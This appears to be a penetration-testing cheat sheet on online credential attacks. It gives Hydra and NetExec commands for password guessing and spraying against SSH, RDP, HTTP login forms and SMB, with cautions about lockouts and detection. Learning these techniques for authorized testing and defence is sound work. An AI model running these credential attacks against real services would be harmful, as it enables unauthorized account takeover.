# Online Brute Force and Password Spraying

Online attacks authenticate repeatedly against a real service. They are **noisy** and can trigger account lockouts, WAF rules, fail2ban, logging, or other defensive controls. Enumerate the service, usernames, and lockout behavior before launching broad attacks.

## Hydra option memory

- `-l <USER>` = one username
- `-L <FILE>` = username list
- `-p <PASS>` = one password
- `-P <FILE>` = password list
- `-s <PORT>` = non-default service port

## SSH — one user, password wordlist

```bash
sudo hydra -l <USER> -P /usr/share/wordlists/rockyou.txt -s <PORT> ssh://<TARGET_IP>
```

Confirm the service first, especially when SSH is on a non-default port:

```bash
sudo nmap -sV -p <PORT> <TARGET_IP>
```

## RDP — password spraying

Use **one known/recovered password against a controlled list of usernames**:

```bash
sudo hydra -L users.txt -p '<PASSWORD>' rdp://<TARGET_IP>
```

A recovered plaintext password is valuable because users may reuse it across systems, but do not spray blindly when lockout policy is unknown.

## HTTP POST login form

First use Burp to capture a failed login and identify:

1. login path,
2. POST body / parameter names,
3. a reliable **failed-login condition string**.

Then build the Hydra request:

```bash
sudo hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> \
  http-post-form "/login.php:username=^USER^&password=^PASS^:<FAILURE_STRING>"
```

The `http-post-form` value has three colon-delimited pieces: **path : request body : failure condition**. Avoid overly generic failure markers such as only `username` or `password`, which can create false positives if those words also appear in successful responses.

## SMB spray

```bash
# Check policy / exposure first
nxc smb <TARGET_IP> -u <USER> -p '<PASSWORD>' --pass-pol

# Controlled spray
nxc smb <TARGET_IP> -u users.txt -p '<PASSWORD>' --continue-on-success
```

## Quick rule

```text
one user + many passwords = targeted dictionary attack
many users + one password = password spray
```
